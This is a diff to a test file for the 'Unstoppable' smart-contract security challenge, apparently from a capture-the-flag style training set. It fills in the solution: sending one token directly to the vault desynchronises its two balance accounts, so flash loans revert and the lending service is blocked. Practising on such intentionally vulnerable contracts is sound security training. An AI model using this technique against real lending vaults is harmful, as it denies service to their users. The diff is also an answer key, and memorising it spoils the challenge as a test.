@@ -44,12 +44,12 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // there are two sources of truth useed in the code. Make them different, the transactions will revert
+        await token.transfer(vault.address, 1);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-
         // It is no longer possible to execute flash loans
         await expect(
             receiverContract.executeFlashLoan(100n * 10n ** 18n)
